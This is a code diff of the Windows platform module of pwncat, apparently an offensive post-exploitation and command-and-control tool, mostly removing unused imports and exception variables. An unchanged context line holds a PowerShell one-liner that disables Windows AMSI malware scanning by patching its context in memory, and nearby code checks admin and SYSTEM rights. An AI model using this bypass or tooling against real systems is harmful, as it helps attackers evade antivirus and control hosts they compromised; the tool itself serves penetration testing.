@@ -25,26 +25,16 @@ import signal
 import hashlib
 import pathlib
 import tarfile
-import termios
 import binascii
-import readline
-import textwrap
 import functools
+import threading
 import subprocess
-from io import (
-    BytesIO,
-    StringIO,
-    RawIOBase,
-    TextIOWrapper,
-    BufferedIOBase,
-    UnsupportedOperation,
-)
+from io import BytesIO, RawIOBase, TextIOWrapper
 from typing import List, Union, BinaryIO, Optional
 from subprocess import TimeoutExpired, CalledProcessError
 from dataclasses import dataclass
 
 import requests
-import pkg_resources
 
 import pwncat
 import pwncat.util
@@ -182,7 +172,10 @@ class WindowsFile(RawIOBase):
 
             try:
                 result = self.platform.run_method(
-                    "File", "write", self.handle, base64.b64encode(data).decode("utf-8")
+                    "File",
+                    "write",
+                    self.handle,
+                    base64.b64encode(chunk).decode("utf-8"),
                 )
             except ProtocolError as exc:
                 # ERROR_BROKEN_PIPE
@@ -493,7 +486,7 @@ class Windows(Platform):
 
             manager.log(f"[blue]windows[/blue]: downloading {plugin.name} plugin")
             with requests.get(
-                plugin.url.format(version=plugin.version),
+                url,
                 stream=True,
             ) as request:
                 data = request.raw.read()
@@ -559,7 +552,7 @@ class Windows(Platform):
         return result
 
     def run_method(self, typ: str, method: str, *args, wait: bool = True):
-        """
+        r"""
         Execute a method within the pwncat-windows-c2. You must specify the type
         and method arguments. Arguments are passed via json encoding so any valid
         JSON types should be passed correctly onto the C2. Named arguments are not
@@ -594,7 +587,7 @@ class Windows(Platform):
                 try:
                     result = self.parse_response(self.channel.recvline())
                     break
-                except (gzip.BadGzipFile, binascii.Error) as exc:
+                except (gzip.BadGzipFile, binascii.Error):
                     continue
                 except KeyboardInterrupt:
                     self.session.log(
@@ -719,9 +712,6 @@ function prompt {
             x.rstrip("\r") for x in result.split("\n") if x.rstrip("\r") != ""
         ][-2]
 
-        # Note whether this is 64-bit or not
-        is_64 = "\\Framework64\\" in install_utils
-
         version = pathlib.PureWindowsPath(install_utils).parts[-2]
 
         self.session.log(
@@ -764,7 +754,7 @@ function prompt {
             self.powershell(
                 """$am = ([Ref].Assembly.GetTypes()  | % { If ( $_.Name -like "*iUtils" ){$_} })[0];$con = ($am.GetFields('NonPublic,Static') | % { If ( $_.Name -like "*Context" ){$_} })[0];$addr = $con.GetValue($null);[IntPtr]$ptr = $addr;[Int32[]]$buf = @(0); if( $ptr -ne $null -and $ptr -ne 0 ) { [System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1); }"""
             )
-        except PowershellError as exc:
+        except PowershellError:
             self.session.log("[yellow]warning[/yellow]: failed to disable AMSI!")
 
     def get_pty(self):
@@ -1024,7 +1014,7 @@ function prompt {
                 self._is_admin = False
 
             self._is_admin = result[0]
-        except PowershellError as exc:
+        except PowershellError:
             # it failed, so safely ignore and continue
             self._is_admin = False
 
@@ -1039,7 +1029,7 @@ function prompt {
 
             self._is_system = bool(username[0].strip() == "SYSTEM")
 
-        except PowershellError as exc:
+        except PowershellError:
             # it failed, so safely ignore and continue
             self._is_system = False
 
@@ -1112,7 +1102,7 @@ function prompt {
             else:
                 value = "$true"
 
-            result = self.powershell(
+            self.powershell(
                 f'Set-ItemProperty -Path "{path}" -Name IsReadOnly -Value {value}'
             )
         except PowershellError as exc:
@@ -1330,7 +1320,7 @@ function prompt {
             try:
                 self.new_item(ItemType="File", Path=str(path / name))
                 break
-            except FileExistsError as exc:
+            except FileExistsError:
                 continue
 
         return (path / name).open(mode=mode)
